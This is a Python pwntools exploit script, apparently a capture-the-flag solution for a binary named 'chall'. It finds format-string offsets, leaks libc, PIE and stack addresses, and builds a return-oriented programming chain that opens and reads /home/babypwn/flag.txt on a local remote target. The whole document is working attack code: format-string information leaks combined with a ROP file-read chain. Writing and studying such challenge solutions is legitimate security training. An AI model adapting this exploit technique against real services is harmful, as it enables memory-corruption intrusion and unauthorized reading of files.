from pwn import *

def offset_finder():
  for x in range (1, 80):
        p = process("./chall")
        
        print "Offset number {}".format(x)

        payload = ""
        # payload += "A" * 8
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        print p.recv()
        # stack_value = p.recvline()[:-1]
        # print stack_value
            
        p.close()

# offset_finder()
# exit()

# p = process("./chall")
p = remote("127.0.0.1", 1337)
binary = ELF("./chall")

pop_rdi = 0x0000000000001503
pop_rsi_r15 = 0x0000000000001501
bss = 0x0000000000004020 + 0x200
read_plt = binary.plt['read']

p.sendline("%47$p-%34$p")

shit = p.recv().split("-")
print shit

libc_leak = int(shit[0], 16) - 243
log.info("Libc leak: {}".format(hex(libc_leak)))
libc_base = libc_leak - 0x026fc0
log.info("Libc base: {}".format(hex(libc_base)))
libc_environ = libc_base + 0x1ef2e0
log.info("Libc environ: {}".format(hex(libc_environ)))
libc_open = libc_base + 0x110e50
log.info("Libc open: {}".format(hex(libc_open)))
libc_puts = libc_base + 0x875a0
log.info("Libc puts: {}".format(hex(libc_puts)))
libc_pop_rdx_rbx = libc_base + 0x0000000000162866
log.info("Libc pop rdx rbx: {}".format(hex(libc_pop_rdx_rbx)))
libc_pop_rdi = libc_base + 0x0000000000026b72
log.info("Libc pop rdi: {}".format(hex(libc_pop_rdi)))
libc_pop_rsi_r15 = libc_base + 0x0000000000026b70
log.info("Libc pop rsi: {}".format(hex(libc_pop_rsi_r15)))

p.sendline(str(hex(libc_environ)))
stack_leak = int(p.recvline()[:-1])
log.info("Stack leak: {}".format(hex(stack_leak)))
ret_stack = stack_leak - 0x100
log.info("Return stack: {}".format(hex(ret_stack)))
pie_leak = int(shit[1], 16)
log.info("Pie leak: {}".format(hex(pie_leak)))
base_pie = pie_leak - 0x40
log.info("Base pie: {}".format(hex(base_pie)))

p.sendline(hex(ret_stack))

payload = ''
payload += p64(libc_pop_rdi)
payload += p64(0)
payload += p64(libc_pop_rsi_r15)
payload += p64(base_pie + bss) * 2
payload += p64(base_pie + read_plt)
payload += p64(libc_pop_rdi)
payload += p64(base_pie + bss)
payload += p64(libc_pop_rsi_r15)
payload += p64(0) * 2
payload += p64(libc_pop_rdx_rbx)
payload += p64(0) * 2
payload += p64(libc_open)
payload += p64(libc_pop_rdi)
payload += p64(3)
payload += p64(libc_pop_rsi_r15)
payload += p64(base_pie + bss + 0x100) * 2
payload += p64(libc_pop_rdx_rbx)
payload += p64(0x100) * 2
payload += p64(base_pie + read_plt)
payload += p64(libc_pop_rdi)
payload += p64(base_pie + bss + 0x100)
payload += p64(libc_puts)

print hex(len(payload))
# gdb.attach(p, 'pie b *0x0000000000001498')
p.sendline(payload)
# gdb.attach(p, 'b *%s' % libc_open)
sleep(1)
p.sendline('/home/babypwn/flag.txt\x00')

p.interactive()